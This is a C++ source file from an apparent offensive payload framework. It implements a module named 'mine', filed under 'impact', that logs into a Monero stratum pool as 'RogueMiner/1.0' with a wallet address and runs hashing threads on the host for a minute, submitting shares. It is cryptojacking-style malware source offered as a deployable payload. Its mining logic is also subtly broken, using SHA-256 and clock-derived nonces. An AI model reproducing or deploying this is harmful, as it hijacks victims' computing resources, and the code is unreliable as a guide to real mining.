#ifndef _WIN32

#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#include <algorithm>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

constexpr int kDialTimeoutMs = 10000;
constexpr int kMineWindowSec = 60;

void sscanf_int(const std::string& s, int& v) {
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t' || s[i] == '\n' || s[i] == '\r' ||
                            s[i] == '\v' || s[i] == '\f'))
        i++;
    bool neg = false;
    if (i < s.size() && (s[i] == '+' || s[i] == '-')) {
        neg = (s[i] == '-');
        i++;
    }
    bool any = false;
    long long acc = 0;
    while (i < s.size() && s[i] >= '0' && s[i] <= '9') {
        any = true;
        acc = acc * 10 + (s[i] - '0');
        if (acc > 2147483647LL) acc = 2147483647LL;
        i++;
    }
    if (!any) return;
    v = (int)(neg ? -acc : acc);
}

std::string json_quote(const std::string& s) {
    std::string out = "\"";
    char buf[8];
    for (unsigned char c : s) {
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            case '<': out += "\\u003c"; break;
            case '>': out += "\\u003e"; break;
            case '&': out += "\\u0026"; break;
            default:
                if (c < 0x20) {
                    std::snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out.push_back((char)c);
                }
        }
    }
    out.push_back('"');
    return out;
}

std::string go_duration_string(long long secs) {
    if (secs < 0) secs = 0;
    long long h = secs / 3600, m = (secs % 3600) / 60, s = secs % 60;
    char buf[64];
    if (h > 0) {
        std::snprintf(buf, sizeof(buf), "%lldh%lldm%llds", h, m, s);
        return buf;
    }
    if (m > 0) {
        std::snprintf(buf, sizeof(buf), "%lldm%llds", m, s);
        return buf;
    }
    std::snprintf(buf, sizeof(buf), "%llds", s);
    return buf;
}

class TcpConn {
  public:
    TcpConn() = default;
    ~TcpConn() { close(); }
    TcpConn(const TcpConn&) = delete;
    TcpConn& operator=(const TcpConn&) = delete;

    bool dial(const std::string& host, int port) {
        if (safe_mode()) return false;
        char portbuf[16];
        std::snprintf(portbuf, sizeof(portbuf), "%d", port);
        struct addrinfo hints;
        std::memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        struct addrinfo* res = nullptr;
        if (getaddrinfo(host.c_str(), portbuf, &hints, &res) != 0 || res == nullptr) return false;

        int fd = -1;
        for (struct addrinfo* ai = res; ai != nullptr; ai = ai->ai_next) {
            fd = ::socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
            if (fd < 0) continue;
            if (!connect_timeout(fd, ai, kDialTimeoutMs)) {
                ::close(fd);
                fd = -1;
                continue;
            }
            break;
        }
        freeaddrinfo(res);
        if (fd < 0) return false;

        struct timeval tv;
        tv.tv_sec = kDialTimeoutMs / 1000;
        tv.tv_usec = (kDialTimeoutMs % 1000) * 1000;
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        fd_ = fd;
        return true;
    }

    bool write(const std::string& data) {
        std::lock_guard<std::mutex> lk(write_mu_);
        size_t off = 0;
        while (off < data.size()) {
            ssize_t n = ::send(fd_, data.data() + off, data.size() - off, MSG_NOSIGNAL);
            if (n <= 0) {
                if (n < 0 && errno == EINTR) continue;
                return false;
            }
            off += (size_t)n;
        }
        return true;
    }

    std::string read_line() {
        std::string out;
        char buf[512];
        for (;;) {
            ssize_t n = ::recv(fd_, buf, sizeof(buf), 0);
            if (n <= 0) break;
            out.append(buf, (size_t)n);
            if (out.find('\n') != std::string::npos) break;
        }
        return out;
    }

    void close() {
        if (fd_ >= 0) {
            ::close(fd_);
            fd_ = -1;
        }
    }

  private:
    static bool connect_timeout(int fd, struct addrinfo* ai, int timeout_ms) {
        int fl = fcntl(fd, F_GETFL, 0);
        if (fl >= 0) fcntl(fd, F_SETFL, fl | O_NONBLOCK);
        int rc = ::connect(fd, ai->ai_addr, ai->ai_addrlen);
        bool ok = (rc == 0);
        if (!ok && errno == EINPROGRESS) {
            struct pollfd pfd;
            pfd.fd = fd;
            pfd.events = POLLOUT;
            pfd.revents = 0;
            if (::poll(&pfd, 1, timeout_ms) > 0) {
                int err = 0;
                socklen_t len = sizeof(err);
                if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &len) == 0 && err == 0) ok = true;
            }
        }
        if (fl >= 0) fcntl(fd, F_SETFL, fl);
        return ok;
    }

    int fd_ = -1;
    std::mutex write_mu_;
};

struct MineResult {
    std::string timestamp;
    std::string wallet;
    std::string pool;
    int threads = 0;
    long long hash_count = 0;
    int shares = 0;
    std::string duration;
};

std::string marshal_result(const MineResult& r) {
    nlohmann::json v;
    v["timestamp"] = r.timestamp;
    v["wallet"] = r.wallet;
    v["pool"] = r.pool;
    v["threads"] = r.threads;
    v["hash_count"] = r.hash_count;
    v["shares"] = r.shares;
    v["duration"] = r.duration;
    return MarshalJSON(v);
}

std::string hex16(unsigned long long v) {
    char buf[17];
    std::snprintf(buf, sizeof(buf), "%016llx", v);
    return buf;
}

class Miner : public Payload {
  public:
    const char* name() const override { return "mine"; }
    const char* category() const override { return "impact"; }
    const char* description() const override {
        return "Monero (XMR) miner connecting to a stratum pool";
    }

    Output execute(const Args& args) const override {
        auto arg = [&](const char* k, const char* def) {
            auto it = args.find(k);
            if (it == args.end() || it->second.empty()) return std::string(def);
            return it->second;
        };
        std::string wallet = arg("wallet", "YOUR_MONERO_WALLET_ADDRESS");
        std::string pool = arg("pool", "pool.supportxmr.com");
        int port = 3333;
        if (args.count("port")) sscanf_int(args.at("port"), port);
        int threads = 2;
        if (args.count("threads")) sscanf_int(args.at("threads"), threads);

        MineResult r = mine(wallet, pool, port, threads);
        std::string s = marshal_result(r);
        return Output(s.begin(), s.end());
    }

  private:
    static MineResult mine(const std::string& wallet, const std::string& pool, int port,
                           int threads) {
        MineResult r;
        r.timestamp = now_rfc3339();
        r.wallet = wallet;
        r.pool = pool;
        r.threads = threads;

        TcpConn conn;
        if (!conn.dial(pool, port)) return r;

        std::string login = "{\"id\":\"0\",\"method\":\"login\",\"params\":{" +
                            std::string("\"agent\":\"RogueMiner/1.0\",") +
                            "\"login\":" + json_quote(wallet) + ",\"pass\":\"x\"}}";
        conn.write(login + "\n");

        std::string resp = conn.read_line();
        std::string job_id, blob, target;
        try {
            nlohmann::json j = nlohmann::json::parse(resp, nullptr, false);
            if (!j.is_discarded() && j.contains("result") && j["result"].is_object()) {
                const auto& job = j["result"];
                if (job.contains("job") && job["job"].is_object()) {
                    const auto& jb = job["job"];
                    if (jb.contains("job_id") && jb["job_id"].is_string())
                        job_id = jb["job_id"].get<std::string>();
                    if (jb.contains("blob") && jb["blob"].is_string())
                        blob = jb["blob"].get<std::string>();
                    if (jb.contains("target") && jb["target"].is_string())
                        target = jb["target"].get<std::string>();
                }
            }
        } catch (const std::exception&) {
        }

        if (job_id.empty()) {
            r.duration = "Login failed";
            return r;
        }

        auto start = std::chrono::steady_clock::now();
        std::mutex mu;
        long long total = 0;
        int shares = 0;
        std::vector<std::thread> workers;
        workers.reserve((size_t)std::max(0, threads));

        for (int wid = 0; wid < threads; wid++) {
            workers.emplace_back([&, wid]() {
                long long local = 0;
                while (std::chrono::duration_cast<std::chrono::seconds>(
                           std::chrono::steady_clock::now() - start)
                           .count() < kMineWindowSec) {
                    long long nanos = (long long)std::chrono::duration_cast<std::chrono::nanoseconds>(
                                          std::chrono::system_clock::now().time_since_epoch())
                                          .count();
                    long long raw = (nanos % 100000000) + (long long)wid * 1000000;
                    if (raw < 0) raw = -raw;
                    std::string nonce = hex16((unsigned long long)raw);

                    Bytes hash;
                    if (blob.size() >= 86) {
                        std::string data = blob.substr(0, 78) + nonce + blob.substr(86);
                        hash = sha256(Bytes(data.begin(), data.end()));
                    } else {
                        hash = sha256(Bytes(0));
                    }
                    local++;

                    std::string hash_hex = to_hex(hash);
                    if (hash_hex.rfind("0000", 0) == 0) {
                        std::string submit = "{\"id\":\"0\",\"method\":\"submit\",\"params\":{" +
                                             std::string("\"id\":\"worker") +
                                             std::to_string(wid) + "\"," +
                                             "\"job_id\":" + json_quote(job_id) + "," +
                                             "\"nonce\":" + json_quote(nonce) + "," +
                                             "\"result\":" + json_quote(hash_hex) + "}}";
                        conn.write(submit + "\n");
                        std::lock_guard<std::mutex> lk(mu);
                        shares++;
                    }
                }
                std::lock_guard<std::mutex> lk(mu);
                total += local;
            });
        }
        for (auto& w : workers) w.join();

        r.hash_count = total;
        r.shares = shares;
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                           std::chrono::steady_clock::now() - start)
                           .count();
        r.duration = go_duration_string(elapsed);
        return r;
    }
};

Miner g_mine;

struct Reg {
    Reg() { Register(&g_mine); }
};
Reg g_reg;

}  // namespace
}  // namespace snake::payloads

#endif  // !_WIN32
